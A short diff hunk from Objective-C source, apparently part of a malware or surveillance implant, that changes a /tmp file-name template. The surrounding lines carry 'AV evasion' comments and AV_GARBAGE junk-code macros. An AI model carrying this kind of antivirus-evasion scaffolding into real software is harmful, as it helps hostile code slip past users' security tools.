@@ -80,7 +80,7 @@ extern BOOL ACInterfaceSetPower(SCNetworkInterfaceRef, BOOL);
   // AV evasion: only on release build
   AV_GARBAGE_002
   
-  tmpXmlName = [[NSString alloc] initWithFormat: @"/tmp/43t9903zz%.8d.XXXX", randTime];
+  tmpXmlName = [[NSString alloc] initWithFormat: @"/tmp/43t8803zz%.8d.XXXX", randTime];
   
   // AV evasion: only on release build
   AV_GARBAGE_006
